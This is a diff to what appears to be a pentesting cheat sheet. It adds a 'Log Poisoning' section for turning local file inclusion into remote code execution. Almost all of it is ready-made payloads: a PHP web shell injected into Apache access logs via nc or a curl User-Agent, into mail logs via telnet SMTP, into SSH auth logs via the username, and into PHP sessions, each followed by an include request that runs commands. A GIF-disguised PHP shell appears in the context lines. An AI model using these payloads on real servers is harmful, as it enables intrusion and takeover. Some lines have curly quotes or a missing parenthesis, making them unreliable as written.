@@ -574,7 +574,49 @@ echo 'GIF8<?php system($_GET["cmd"]); ?>' > ok.gif
 /codes/lfi/ok.jpg
 
 #### Log Poisoning
+ 
+-> apache
 
+nc ip 80
+  
+<?php system($_GET[‘cmd’]); ?>  
+  
+or
+  
+curl http://ip/index.php -A '<?php system($_GET[‘cmd’]); ?>'
+  
+http://ip/index.php?file=/var/log/apache2/access.log&cmd=id
+  
+-> mail
+
+telnet ip 23
+  
+MAIL FROM: email@gmail.com
+  
+RCPT TO: <?php system($_GET[‘cmd’]); ?>
+  
+http://ip/index.php?file=/var/mail/mail.log&cmd=id
+  
+-> ssh
+  
+ssh ‘<?php system($_GET[‘cmd’]);?>’@ip
+  
+http://ip/index.php?file=/var/log/auth.log&cmd=id
+  
+-> PHP session
+
+http://ip/index.php?file=<?php system($_GET["cmd"];?>
+  
+/var/lib/php/sessions/sess_<your_session>&cmd=id
+  
+-> Others:
+
+/var/log/sshd.log
+
+/var/log/vsftpd.log
+
+/proc/self/fd/0-50
+  
 ### LFI - files for fuzzing
 
 ### Wordlist LFI - Linux
